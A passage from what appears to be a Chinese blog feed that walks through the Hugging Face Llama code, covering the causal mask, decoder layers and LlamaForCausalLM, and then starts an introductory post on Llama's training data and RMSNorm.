past_key_values_length = key_value_length - query_length<br><br>  <span class="hljs-comment"># create causal mask</span><br>  <span class="hljs-comment"># [bsz, seq_len] -&gt; [bsz, 1, tgt_seq_len, src_seq_len]</span><br>  causal_4d_mask = <span class="hljs-literal">None</span><br>  <span class="hljs-keyword">if</span> input_shape[-<span class="hljs-number">1</span>] &gt; <span class="hljs-number">1</span> <span class="hljs-keyword">or</span> self.sliding_window <span class="hljs-keyword">is</span> <span class="hljs-keyword">not</span> <span class="hljs-literal">None</span>:<br>      causal_4d_mask = self._make_causal_mask(<br>          input_shape,<br>          dtype,<br>          device=device,<br>          past_key_values_length=past_key_values_length,<br>          sliding_window=self.sliding_window,<br>      )<br><br>  <span class="hljs-keyword">return</span> causal_4d_mask<br></code></pre></td></tr></table></figure><p>上面的函数输入是一个二维张量<code>(batch_size, seq_len)</code>，输出是一个四维<code>(batch_size, 1, seq_len, key_value_len)</code>。该函数会去调用 <code>AttentionMaskConverter</code> 的 <code>to_causal_4d</code> 或 <code>to_4d</code>，而它们俩弯弯绕绕的，但最终仍离不开 <code>_make_causal_mask</code>：</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-keyword">def</span> <span class="hljs-title function_">_make_causal_mask</span>(<span class="hljs-params"></span><br><span class="hljs-params">  input_ids_shape: torch.Size,</span><br><span class="hljs-params">  dtype: torch.dtype,</span><br><span class="hljs-params">  device: torch.device,</span><br><span class="hljs-params">  past_key_values_length: <span class="hljs-built_in">int</span> = <span class="hljs-number">0</span>,</span><br><span class="hljs-params">  sliding_window: <span class="hljs-type">Optional</span>[<span class="hljs-built_in">int</span>] = <span class="hljs-literal">None</span>,</span><br><span class="hljs-params"></span>):<br>  bsz, tgt_len = input_ids_shape<br>  mask = torch.full((tgt_len, tgt_len), torch.finfo(dtype).<span class="hljs-built_in">min</span>, device=device)<br>  mask_cond = torch.arange(mask.size(-<span class="hljs-number">1</span>), device=device)<br>  mask.masked_fill_(mask_cond &lt; (mask_cond + <span class="hljs-number">1</span>).view(mask.size(-<span class="hljs-number">1</span>), <span class="hljs-number">1</span>), <span class="hljs-number">0</span>)<br>  mask = mask.to(dtype)<br><br>  <span class="hljs-keyword">if</span> past_key_values_length &gt; <span class="hljs-number">0</span>:<br>    mask = torch.cat([torch.zeros(tgt_len, past_key_values_length, dtype=dtype, device=device), mask], dim=-<span class="hljs-number">1</span>)<br><br>  <span class="hljs-comment"># add lower triangular sliding window mask if necessary</span><br>  <span class="hljs-keyword">if</span> sliding_window <span class="hljs-keyword">is</span> <span class="hljs-keyword">not</span> <span class="hljs-literal">None</span>:<br>    diagonal = past_key_values_length - sliding_window + <span class="hljs-number">1</span><br>    context_mask = <span class="hljs-number">1</span> - torch.triu(torch.ones_like(mask, dtype=torch.<span class="hljs-built_in">int</span>), diagonal=diagonal)<br>    mask.masked_fill_(context_mask.<span class="hljs-built_in">bool</span>(), torch.finfo(dtype).<span class="hljs-built_in">min</span>)<br><br>  <span class="hljs-keyword">return</span> mask[<span class="hljs-literal">None</span>, <span class="hljs-literal">None</span>, :, :].expand(bsz, <span class="hljs-number">1</span>, tgt_len, tgt_len + past_key_values_length)<br></code></pre></td></tr></table></figure><p><code>_make_causal_mask</code> 函数最关键的是前几句话。首先 <code>mask</code> 会被初始化成 <code>(batch_size, seq_len)</code> 维度的矩阵，初始值为很大的负数👇。</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs python">mask = torch.full((tgt_len, tgt_len), torch.finfo(dtype).<span class="hljs-built_in">min</span>, device=device)<br></code></pre></td></tr></table></figure><p>然后使用 <code>mask_cond</code> 来将<strong>矩阵下半角矩阵归零</strong>，重点在<code>mask_cond &lt; (mask_cond + 1).view(mask.size(-1), 1)</code>。此处两个横纵向量一比较会产生一个上三角矩阵。随后将全零矩阵与 <code>mask</code> 相连接，最后改变矩阵维度为 <code>(bsz, 1, seq_len, key_value_len)</code>返回。</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs python">mask_cond = torch.arange(mask.size(-<span class="hljs-number">1</span>), device=device)<br>mask.masked_fill_(mask_cond &lt; (mask_cond + <span class="hljs-number">1</span>).view(mask.size(-<span class="hljs-number">1</span>), <span class="hljs-number">1</span>), <span class="hljs-number">0</span>)<br></code></pre></td></tr></table></figure><p>这里大家不妨思考一下：为什么 Mask 矩阵必须是下三角归零，而上三角全为最小值？上文只是简单地说是为了防止“作弊”。具体原因是：生成文本序列时，模型只能参考之前的词，而不能参考未来生成的词。当 decoder 使用 masked 注意力机制生成输出时，计算 $ QK^T $ 的注意力权重时，我们允许 query 去查看之前生成词的信息，但不允许 query 查看之后生成的词（因为它们还未被产生）。对应到矩阵乘法中，就意味着 query 对应的行向量序号必须大于等于 key 的行向量序号。</p><p><strong>译码层</strong></p><p>好，我们在注意力掩码这边花了太多功夫了。接下来继续看 <code>forward</code> 函数的实现👇：首先是初始化张量，然后就是 <code>llamaModel</code> 对译码层的具体处理。对于这个主 for 循环，先抛开使用检查点的逻辑部分，直接看调用 <code>decoder_layer</code> 部分，就会发现循环只是在不断地调用 <code>decoder_layer</code>（也就是 <code>LlamaDecoderLayer:forward</code>）来进行推理，然后把得到的输出结果再作为下一层的输入继续前推，直到所有子层的前推结束。循环退出后，<code>hidden_states</code> 会最后加一层归一化，最后通过 transformers 自带的 <code>BaseModelOutputWithPast</code> 将最后的输出张量和 kv 相关信息返回，该类是框架中包含 past kv 值的基础模型输出类，关于此类就不详细展开讲了。</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-comment"># decoder layers</span><br><span class="hljs-comment"># initialize  all_hidden_states all_self_attns next_decoder_cache</span><br><span class="hljs-keyword">for</span> idx, decoder_layer <span class="hljs-keyword">in</span> <span class="hljs-built_in">enumerate</span>(self.layers):<br>  <span class="hljs-keyword">if</span> output_hidden_states:<br>    all_hidden_states += (hidden_states,)<br>  past_key_value = past_key_values[idx] <span class="hljs-keyword">if</span> past_key_values <span class="hljs-keyword">is</span> <span class="hljs-keyword">not</span> <span class="hljs-literal">None</span> <span class="hljs-keyword">else</span> <span class="hljs-literal">None</span><br><br>  <span class="hljs-keyword">if</span> self.gradient_checkpointing <span class="hljs-keyword">and</span> self.training:<br>    <span class="hljs-comment">#layer_outputs = self._gradient_checkpointing_func(</span><br>  <span class="hljs-keyword">else</span>:<br>      layer_outputs = decoder_layer(<br>          hidden_states,<br>          attention_mask=attention_mask,<br>          position_ids=position_ids,<br>          past_key_value=past_key_value,<br>          output_attentions=output_attentions,<br>          use_cache=use_cache,<br>      )<br><br>  hidden_states = layer_outputs[<span class="hljs-number">0</span>]<br><br>  <span class="hljs-keyword">if</span> use_cache:<br>      next_decoder_cache += (layer_outputs[<span class="hljs-number">2</span> <span class="hljs-keyword">if</span> output_attentions <span class="hljs-keyword">else</span> <span class="hljs-number">1</span>],)<br><br>  <span class="hljs-keyword">if</span> output_attentions:<br>      all_self_attns += (layer_outputs[<span class="hljs-number">1</span>],)<br><br>hidden_states = self.norm(hidden_states)<br><br><span class="hljs-comment"># add hidden states from the last decoder layer</span><br><span class="hljs-keyword">if</span> output_hidden_states:<br>  all_hidden_states += (hidden_states,)<br><br>next_cache = next_decoder_cache <span class="hljs-keyword">if</span> use_cache <span class="hljs-keyword">else</span> <span class="hljs-literal">None</span><br><span class="hljs-keyword">if</span> <span class="hljs-keyword">not</span> return_dict:<br>  <span class="hljs-keyword">return</span> <span class="hljs-built_in">tuple</span>(v <span class="hljs-keyword">for</span> v <span class="hljs-keyword">in</span> [hidden_states, next_cache, all_hidden_states, all_self_attns] <span class="hljs-keyword">if</span> v <span class="hljs-keyword">is</span> <span class="hljs-keyword">not</span> <span class="hljs-literal">None</span>)<br><span class="hljs-keyword">return</span> BaseModelOutputWithPast(<br>  last_hidden_state=hidden_states,<br>  past_key_values=next_cache,<br>  hidden_states=all_hidden_states,<br>  attentions=all_self_attns,<br>)<br></code></pre></td></tr></table></figure><p>篇外：for 循环中使用 <code>gradient_checkpointing</code> 可以有效节约显存，详细内容可以参考 <a href="https://pytorch.org/docs/stable/checkpoint.html"><code>torch.utils.checkpoint.checkpoint</code></a>。它的原理非常简单：规定程序在对 <code>decoderLayer</code> 进行前推时，不保存中间计算值。而若模型需要自动微分以完成 backward，程序会重新计算这些中间值，从而节省了模型运算需要的内存空间。因此，<code>use_cache</code> 和 <code>gradient_checkpointing</code>最好不要同时设置为 true，因为一个是用空间换时间，一个是时间换空间，两者可能会互相抵消优化影响。</p><h2 id="最终成型">最终成型</h2><p>由于篇幅关系，这里仅介绍最常用的 <code>LlamaForCausalLM</code>，该模型是因果类语言模型，可以根据用户给的上文来续写下文，也可以回答用户提出的问题。</p><h3 id="LlamaForCausalLM">LlamaForCausalLM</h3><p><code>LlamaForCausalLM</code> 是 Llama 因果类语言模型，可以根据用户输入的文本输出相应的回答。技术上看，它在 <code>LlamaModel</code> 的基础上增加了一个线性层 <code>lm_head</code> 作为 Generator，从而实现了一个完整的语言模型。我们来看一下它的 <code>forward</code> 函数👇，若仔细对比之前模型的输入参数，会发现多了一个可选传入的 <code>label</code> 张量，该张量形状是 <code>(batch_size, seq_len)</code>，它是用于计算 masked 语言模型的损失值。该模型的 <code>forward</code> 函数在准备好输入的参数后，就直接调用了 <code>LlamaModel:forward()</code>。</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-keyword">def</span> <span class="hljs-title function_">forward</span>(<span class="hljs-params"></span><br><span class="hljs-params">  self,</span><br><span class="hljs-params">  input_ids: torch.LongTensor = <span class="hljs-literal">None</span>,</span><br><span class="hljs-params">  attention_mask: <span class="hljs-type">Optional</span>[torch.Tensor] = <span class="hljs-literal">None</span>,</span><br><span class="hljs-params">  position_ids: <span class="hljs-type">Optional</span>[torch.LongTensor] = <span class="hljs-literal">None</span>,</span><br><span class="hljs-params">  past_key_values: <span class="hljs-type">Optional</span>[<span class="hljs-type">List</span>[torch.FloatTensor]] = <span class="hljs-literal">None</span>,</span><br><span class="hljs-params">  inputs_embeds: <span class="hljs-type">Optional</span>[torch.FloatTensor] = <span class="hljs-literal">None</span>,</span><br><span class="hljs-params">  labels: <span class="hljs-type">Optional</span>[torch.LongTensor] = <span class="hljs-literal">None</span>,</span><br><span class="hljs-params">  use_cache: <span class="hljs-type">Optional</span>[<span class="hljs-built_in">bool</span>] = <span class="hljs-literal">None</span>,</span><br><span class="hljs-params">  output_attentions: <span class="hljs-type">Optional</span>[<span class="hljs-built_in">bool</span>] = <span class="hljs-literal">None</span>,</span><br><span class="hljs-params">  output_hidden_states: <span class="hljs-type">Optional</span>[<span class="hljs-built_in">bool</span>] = <span class="hljs-literal">None</span>,</span><br><span class="hljs-params">  return_dict: <span class="hljs-type">Optional</span>[<span class="hljs-built_in">bool</span>] = <span class="hljs-literal">None</span>,</span><br><span class="hljs-params"></span>) -&gt; <span class="hljs-type">Union</span>[<span class="hljs-type">Tuple</span>, CausalLMOutputWithPast]:<br><br>output_attentions = output_attentions <span class="hljs-keyword">if</span> output_attentions <span class="hljs-keyword">is</span> <span class="hljs-keyword">not</span> <span class="hljs-literal">None</span> <span class="hljs-keyword">else</span> self.config.output_attentions<br>output_hidden_states = (<br>    output_hidden_states <span class="hljs-keyword">if</span> output_hidden_states <span class="hljs-keyword">is</span> <span class="hljs-keyword">not</span> <span class="hljs-literal">None</span> <span class="hljs-keyword">else</span> self.config.output_hidden_states<br>)<br>return_dict = return_dict <span class="hljs-keyword">if</span> return_dict <span class="hljs-keyword">is</span> <span class="hljs-keyword">not</span> <span class="hljs-literal">None</span> <span class="hljs-keyword">else</span> self.config.use_return_dict<br><br><span class="hljs-comment"># decoder outputs consists of (dec_features, layer_state, dec_hidden, dec_attn)</span><br>outputs = self.model(<br>    input_ids=input_ids,<br>    attention_mask=attention_mask,<br>    position_ids=position_ids,<br>    past_key_values=past_key_values,<br>    inputs_embeds=inputs_embeds,<br>    use_cache=use_cache,<br>    output_attentions=output_attentions,<br>    output_hidden_states=output_hidden_states,<br>    return_dict=return_dict,<br>)<br></code></pre></td></tr></table></figure><p>随后，将拿到手的 <code>outputs</code> 放入到添加的线性层 <code>lm_head</code> 进行运算。同理，TP 并行时会将线性层的矩阵在 dim=0 维度拆分。若传入了 <code>label</code>，那么得到的结果 <code>logits</code> 在经过移位后计算交叉熵 <code>CrossEntropyLoss()</code>，若无则可直接通过 <code>CausalLMOutputWithPast</code> 返回。</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br></pre></td><td class="code"><pre><code class="hljs python">hidden_states = outputs[<span class="hljs-number">0</span>]<br><span class="hljs-keyword">if</span> self.config.pretraining_tp &gt; <span class="hljs-number">1</span>:<br>  lm_head_slices = self.lm_head.weight.split(self.vocab_size // self.config.pretraining_tp, dim=<span class="hljs-number">0</span>)<br>  logits = [F.linear(hidden_states, lm_head_slices[i]) <span class="hljs-keyword">for</span> i <span class="hljs-keyword">in</span> <span class="hljs-built_in">range</span>(self.config.pretraining_tp)]<br>  logits = torch.cat(logits, dim=-<span class="hljs-number">1</span>)<br><span class="hljs-keyword">else</span>:<br>  logits = self.lm_head(hidden_states)<br>logits = logits.<span class="hljs-built_in">float</span>()<br>loss = <span class="hljs-literal">None</span><br><span class="hljs-keyword">if</span> labels <span class="hljs-keyword">is</span> <span class="hljs-keyword">not</span> <span class="hljs-literal">None</span>:<br>  <span class="hljs-comment"># Shift so that tokens &lt; n predict n</span><br>  shift_logits = logits[..., :-<span class="hljs-number">1</span>, :].contiguous()<br>  shift_labels = labels[..., <span class="hljs-number">1</span>:].contiguous()<br>  <span class="hljs-comment"># Flatten the tokens</span><br>  loss_fct = CrossEntropyLoss()<br>  shift_logits = shift_logits.view(-<span class="hljs-number">1</span>, self.config.vocab_size)<br>  shift_labels = shift_labels.view(-<span class="hljs-number">1</span>)<br>  <span class="hljs-comment"># Enable model parallelism</span><br>  shift_labels = shift_labels.to(shift_logits.device)<br>  loss = loss_fct(shift_logits, shift_labels)<br><span class="hljs-keyword">if</span> <span class="hljs-keyword">not</span> return_dict:<br>  output = (logits,) + outputs[<span class="hljs-number">1</span>:]<br>  <span class="hljs-keyword">return</span> (loss,) + output <span class="hljs-keyword">if</span> loss <span class="hljs-keyword">is</span> <span class="hljs-keyword">not</span> <span class="hljs-literal">None</span> <span class="hljs-keyword">else</span> output<br><span class="hljs-keyword">return</span> CausalLMOutputWithPast(<br>    loss=loss,<br>    logits=logits,<br>    past_key_values=outputs.past_key_values,<br>    hidden_states=outputs.hidden_states,<br>    attentions=outputs.attentions,<br>)<br></code></pre></td></tr></table></figure><p>使用 huggingface 框架实现的 <code>LlamaForCausalLM</code> 进行推理的示例如下，从该示例中我们可以更好地理解大模型的推理过程：比如说，上面的输入张量<code>input_ids</code> 是用户输入的处理后的“文本”。而最初用户输入的字符串<code>prompt</code> 先进入 tokenizer 进行分词，随后编码、嵌入技术变为张量。这里最重要的函数莫属于 <code>model.generate</code>，但它只能在推理时使用。它除了在背后默默调用了上面的 <code>forward</code>，还做了很多：用于多种解码策略，例如 beam search、top-k 采样等……详细的文章可以在<a href="https://huggingface.co/blog/how-to-generate">这篇博客</a>中找到。生成产生的张量人类无法直接看懂，还需要经过解码 <code>batch_decode</code> 才能呈现流利的英语。</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-keyword">from</span> transformers <span class="hljs-keyword">import</span> AutoTokenizer, LlamaForCausalLM<br><br>model = LlamaForCausalLM.from_pretrained(PATH_TO_CONVERTED_WEIGHTS)<br>tokenizer = AutoTokenizer.from_pretrained(PATH_TO_CONVERTED_TOKENIZER)<br>prompt = <span class="hljs-string">&quot;Hey, are you conscious? Can you talk to me?&quot;</span><br>inputs = tokenizer(prompt, return_tensors=<span class="hljs-string">&quot;pt&quot;</span>)<br><span class="hljs-comment"># Generate</span><br>generate_ids = model.generate(inputs.input_ids, max_length=<span class="hljs-number">30</span>)<br>tokenizer.batch_decode(generate_ids, skip_special_tokens=<span class="hljs-literal">True</span>, clean_up_tokenization_spaces=<span class="hljs-literal">False</span>)[<span class="hljs-number">0</span>]<br><span class="hljs-string">&quot;Hey, are you conscious? Can you talk to me?\nI&#x27;m not conscious, but I can talk to you.&quot;</span><br></code></pre></td></tr></table></figure><h2 id="小结">小结</h2><p>本文从 llama 是什么出发，深入解读了 huggingface 框架对 llama 的代码实现。我先从 llama 论文开始解读，试图让所有未接触过大模型的外行人能理解大模型是如何被训练产生的。随后，我给出了 llama 的架构图，并简要说明了 llama1/2 和 transformer 框架的区别，以及为何要这样改进。然后，我从基础到上层逐个分析了 llama 的代码实现，由于我也是第一次如此细致地阅读大模型的代码，因此很多地方可能会比较啰嗦。但万事开头难，在研究的最初阶段尽可能搞清楚最基本的东西，步步为营方能豁然开朗。另外，本篇博文必不可能覆盖 llama 乃至大模型的方方面面，我等还需继续努力，进一步揭开大模型的神秘面纱。</p>]]></content>
    
    
    <categories>
      
      <category>AI</category>
      
    </categories>
    
    
    <tags>
      
      <tag>AI</tag>
      
      <tag>Transformer</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>huggingface下llama代码细读（上）</title>
    <link href="/2023/10/30/2023-10-30-huggingface1/"/>
    <url>/2023/10/30/2023-10-30-huggingface1/</url>
    
    <content type="html"><![CDATA[<h1>huggingface下llama代码细读（上）</h1><h2 id="llama-是什么">llama 是什么</h2><p>llama 是 meta 公司于 2023 年初发布的一个大语言模型。根据<a href="https://ai.meta.com/blog/large-language-model-llama-meta-ai/">官网</a>上对llama的介绍，meta 公司发布的语言模型可以帮助那些无法拥有大量计算资源的研究人员小成本地进入 AI 大模型领域进行研究。也正因如此，llama 成为了除 ChatGPT 外最有名的大模型之一。为了满足不同级别的研究需要，meta 向全社会提供了经过初步训练的多个不同权重大小的模型数据（7B、13B、33B 和 65B）。</p><p>从<a href="https://arxiv.org/abs/2302.13971">论文</a>中看，llama 使用了世界上高质量的文本数据进行训练，使用到的训练数据包括：</p><ul><li>English CommonCrawl [67%]</li><li>C4 [15%]</li><li>Github [4.5%]</li><li>Wikipedia [4.5%]</li><li>Gutenberg and Books3 [4.5%]</li><li>ArXiv [2.5%]</li><li>Stack Exchange [2%]</li></ul><p>llama 使用的分词（Tokenizer）算法是由 SentencePiece 实现的 Byte-pair-encoding(BPE) 算法，所有的训练数据大约包含了 1.4T 个 tokens。每个 token 在训练期间仅使用一次，但维基百科和图书等数据除外。在发布 llama 后不久，meta 又发布了 llama-2 模型，接下来，我们会对 llama 和 llama-2 模型架构和实现做详细的讨论。</p><h2 id="llama-架构">llama 架构</h2><p>从<a href="https://research.facebook.com/publications/llama-open-and-efficient-foundation-language-models/">论文</a>中可知，llama 模型是由大名鼎鼎的 <a href="https://arxiv.org/abs/1706.03762">Transformer</a> 架构搭成的，但它也做了如下三点改进：</p><ul><li>Pre-Normalization Using <a href="https://openreview.net/forum?id=BylmcHHgIB">RMSNorm</a>（使用 RMSNorm 前置归一）<ul><li>What：在 Transformer 架构的基础上，将归一化操作前置到每层的输入前，并改用 Root Mean Square Normalization（RMSNorm）完成归一</li><li>How：<span class="katex"><span class="katex-mathml"><math xmlns="http://www.w3.org/1998/Math/MathML"><semantics><mrow><mi>R</mi><mi>M</mi><mi>S</mi><mo stretchy="false">(</mo><mi>a</mi><mo stretchy="false">)</mo><mo>=</mo><msqrt><mrow><mfrac><mn>1</mn><mi>n</mi></mfrac><msubsup><mo>∑</mo><mi>i</mi><mi>n</mi></msubsup><msubsup><mi>a</mi><mi>i</mi><mn>2</mn></msubsup></mrow></msqrt></mrow><annotation encoding="application/x-tex">RMS(a) = \sqrt{\frac{1}{n}\sum_i^n{a_i^2}}</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:1em;vertical-align:-0.25em;"></span><span class="mord mathnormal" style="margin-right:0.05764em;">RMS</span><span class="mopen">(</span><span class="mord mathnormal">a</span><span class="mclose">)</span><span class="mspace" style="margin-right:0.2778em;"></span><span class="mrel">=</span><span class="mspace" style="margin-right:0.2778em;"></span></span><span class="base"><span class="strut" style="height:1.84em;vertical-align:-0.6049em;"></span><span class="mord sqrt"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height:1.2351em;"><span class="svg-align" style="top:-3.8em;"><span class="pstrut" style="height:3.8em;"></span><span class="mord" style="padding-left:1em;"><span class="mord"><span class="mopen nulldelimiter"></span><span class="mfrac"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height:0.8451em;"><span style="top:-2.655em;"><span class="pstrut" style="height:3em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mtight"><span class="mord mathnormal mtight">n</span></span></span></span><span style="top:-3.23em;"><span class="pstrut" style="height:3em;"></span><span class="frac-line" style="border-bottom-width:0.04em;"></span></span><span style="top:-3.394em;"><span class="pstrut" style="height:3em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mtight"><span class="mord mtight">1</span></span></span></span></span><span class="vlist-s">​</span></span><span class="vlist-r"><span class="vlist" style="height:0.345em;"><span></span></span></span></span></span><span class="mclose nulldelimiter"></span></span><span class="mspace" style="margin-right:0.1667em;"></span><span class="mop"><span class="mop op-symbol small-op" style="position:relative;top:0em;">∑</span><span class="msupsub"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height:0.8043em;"><span style="top:-2.4003em;margin-left:0em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mathnormal mtight">i</span></span></span><span style="top:-3.2029em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mathnormal mtight">n</span></span></span></span><span class="vlist-s">​</span></span><span class="vlist-r"><span class="vlist" style="height:0.2997em;"><span></span></span></span></span></span></span><span class="mspace" style="margin-right:0.1667em;"></span><span class="mord"><span class="mord"><span class="mord mathnormal">a</span><span class="msupsub"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height:0.7959em;"><span style="top:-2.4231em;margin-left:0em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mathnormal mtight">i</span></span></span><span style="top:-3.0448em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mtight">2</span></span></span></span><span class="vlist-s">​</span></span><span class="vlist-r"><span class="vlist" style="height:0.2769em;"><span></span></span></span></span></span></span></span></span></span><span style="top:-3.1951em;"><span class="pstrut" style="height:3.8em;"></span><span class="hide-tail" style="min-width:1.02em;height:1.88em;"><svg xmlns="http://www.w3.org/2000/svg" width="400em" height="1.88em" viewBox="0 0 400000 1944" preserveAspectRatio="xMinYMin slice"><path d="M983 90l0 -0c4,-6.7,10,-10,18,-10 H400000v40H1013.1s-83.4,268,-264.1,840c-180.7,572,-277,876.3,-289,913c-4.7,4.7,-12.7,7,-24,7s-12,0,-12,0c-1.3,-3.3,-3.7,-11.7,-7,-25c-35.3,-125.3,-106.7,-373.3,-214,-744c-10,12,-21,25,-33,39s-32,39,-32,39c-6,-5.3,-15,-14,-27,-26s25,-30,25,-30c26.7,-32.7,52,-63,76,-91s52,-60,52,-60s208,722,208,722c56,-175.3,126.3,-397.3,211,-666c84.7,-268.7,153.8,-488.2,207.5,-658.5c53.7,-170.3,84.5,-266.8,92.5,-289.5zM1001 80h400000v40h-400000z"/></svg></span></span></span><span class="vlist-s">​</span></span><span class="vlist-r"><span class="vlist" style="height:0.6049em;"><span></span></span></span></span></span></span></span></span>，<span class="katex"><span class="katex-mathml"><math xmlns="http://www.w3.org/1998/Math/MathML"><semantics><mrow><msub><mover accent="true"><mi>a</mi><mo>ˉ</mo></mover><mi>i</mi></msub><mo>=</mo><mfrac><msub><mi>a</mi><mi>i</mi></msub><mrow><mi>R</mi><mi>M</mi><mi>S</mi><mo stretchy="false">(</mo><mi>a</mi><mo stretchy="false">)</mo></mrow></mfrac><msub><mi>g</mi><mi>i</mi></msub></mrow><annotation encoding="application/x-tex">\bar{a}_i = \frac{a_i}{RMS(a)}g_i</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:0.7178em;vertical-align:-0.15em;"></span><span class="mord"><span class="mord accent"><span class="vlist-t"><span class="vlist-r"><span class="vlist" style="height:0.5678em;"><span style="top:-3em;"><span class="pstrut" style="height:3em;"></span><span class="mord mathnormal">a</span></span><span style="top:-3em;"><span class="pstrut" style="height:3em;"></span><span class="accent-body" style="left:-0.25em;"><span class="mord">ˉ</span></span></span></span></span></span></span><span class="msupsub"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height:0.3117em;"><span style="top:-2.55em;margin-left:0em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mathnormal mtight">i</span></span></span></span><span class="vlist-s">​</span></span><span class="vlist-r"><span class="vlist" style="height:0.15em;"><span></span></span></span></span></span></span><span class="mspace" style="margin-right:0.2778em;"></span><span class="mrel">=</span><span class="mspace" style="margin-right:0.2778em;"></span></span><span class="base"><span class="strut" style="height:1.2315em;vertical-align:-0.52em;"></span><span class="mord"><span class="mopen nulldelimiter"></span><span class="mfrac"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height:0.7115em;"><span style="top:-2.655em;"><span class="pstrut" style="height:3em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mtight"><span class="mord mathnormal mtight" style="margin-right:0.05764em;">RMS</span><span class="mopen mtight">(</span><span class="mord mathnormal mtight">a</span><span class="mclose mtight">)</span></span></span></span><span style="top:-3.23em;"><span class="pstrut" style="height:3em;"></span><span class="frac-line" style="border-bottom-width:0.04em;"></span></span><span style="top:-3.4101em;"><span class="pstrut" style="height:3em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mtight"><span class="mord mtight"><span class="mord mathnormal mtight">a</span><span class="msupsub"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height:0.3281em;"><span style="top:-2.357em;margin-left:0em;margin-right:0.0714em;"><span class="pstrut" style="height:2.5em;"></span><span class="sizing reset-size3 size1 mtight"><span class="mord mathnormal mtight">i</span></span></span></span><span class="vlist-s">​</span></span><span class="vlist-r"><span class="vlist" style="height:0.143em;"><span></span></span></span></span></span></span></span></span></span></span><span class="vlist-s">​</span></span><span class="vlist-r"><span 